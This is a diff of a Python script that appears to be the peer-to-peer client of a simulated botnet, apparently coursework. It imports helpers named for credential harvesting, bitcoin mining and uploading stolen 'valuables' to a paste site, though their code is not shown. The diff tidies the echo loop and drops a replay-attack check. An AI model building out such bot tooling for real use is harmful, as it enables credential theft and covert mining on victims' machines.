@@ -4,7 +4,10 @@ import threading
 
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
-from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
+from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, \
+    upload_valuables_to_pastebot, valuables
+
+
 def p2p_upload(fn):
     # Check if the file exists before sending empty
     if fn not in filestore:
@@ -14,6 +17,7 @@ def p2p_upload(fn):
     sconn.send(bytes("FILE", "ascii"))
     p2p_upload_file(sconn, fn)
 
+
 def p2p_echo():
     try:
         sconn = find_bot()
@@ -22,25 +26,22 @@ def p2p_echo():
         sconn.verbose2 = False
         sconn.send(bytes("ECHO", "ascii"))
         while 1:
-            # Read a message and send it to the other bot
+            # Client receive nonce from server
             sconn.recv()
-            # if i==0 or (i>0 and list[i-1]!=nonce):
+            # Read a message and send it to the other bot
             msg = input("Echo> ")
-            # Set verbose2 to true if server is ready to recieve data
             sconn.verbose2 = True
             byte_msg = bytes(msg, "ascii")
             sconn.send(byte_msg)
             # This other bot should echo it back to us
             echo = sconn.recv()
             # If the msg is x or exit or quit, then terminate the connection
-            # If a replay attack is detected, then terminate the connection
-            if byte_msg == b'x' or msg.lower() == "exit" or msg.lower() == "quit" or echo == b'replayattack':
+            if byte_msg == b'x' or msg.lower() == "exit" or msg.lower() == "quit":
                 sconn.close()
                 break
-            print("--------------------------------------")
-
     except socket.error:
         print("Connection closed unexpectedly")
+
 
 if __name__ == "__main__":
     # Start a new thread to accept P2P echo or P2P upload requests
